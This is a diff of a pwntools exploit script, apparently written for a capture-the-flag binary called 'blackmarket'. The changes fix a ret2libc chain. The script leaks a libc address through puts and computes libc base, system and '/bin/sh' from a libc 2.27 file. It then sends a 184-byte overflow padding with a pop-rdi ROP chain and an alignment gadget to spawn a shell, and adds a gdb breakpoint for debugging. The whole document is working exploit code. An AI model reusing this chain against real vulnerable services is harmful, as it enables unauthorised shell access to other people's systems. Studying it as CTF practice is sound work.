@@ -4,7 +4,7 @@ def exploit():
     #p = remote("127.0.0.1", 8888)
     p = process("./blackmarket")
     binary = ELF("./blackmarket")
-    #libc = ELF("libc6_2.27-3ubuntu1_amd64.so")
+    libc = ELF("libc6_2.27-3ubuntu1_amd64.so")
     padding = 184
     poprdi = 0x0000000000401f23
     plt_puts = binary.symbols["plt.puts"]
@@ -21,16 +21,27 @@ def exploit():
     p.recvuntil("Thanks! we will proceed your request :)\n")
     libc_leak = u64(p.recvline()[:-1].ljust(8, "\x00"))
     log.info("Libc leak: {}".format(hex(libc_leak)))
-    system_libc = libc_leak - 0x31580
+    libc_base = libc_leak - 0x0809c0
+    log.info("Libc base: {}".format(hex(libc_base)))
+    system_libc = libc_base + libc.symbols["system"]
     log.info("System Libc leak: {}".format(hex(system_libc)))
-    str_bin_sh = libc_leak + 0x1334da
+    str_bin_sh = libc_base + libc.search("/bin/sh").next()
     log.info("/bin/sh libc leak: {}".format(hex(str_bin_sh)))
 
+    for i in range(5):
+        p.sendline("9")
     payload = "A" * padding
     payload += p64(poprdi)
     payload += p64(str_bin_sh)
+    payload += p64(0x0000000000401f21)
+    payload += p64(0)*2
     payload += p64(system_libc)
-    payload += "JUNK" * 2
+
+    gdb.attach(p, '''
+                b *main+1280
+                c
+                ''')
+
     p.sendline(payload)
     p.interactive()
 
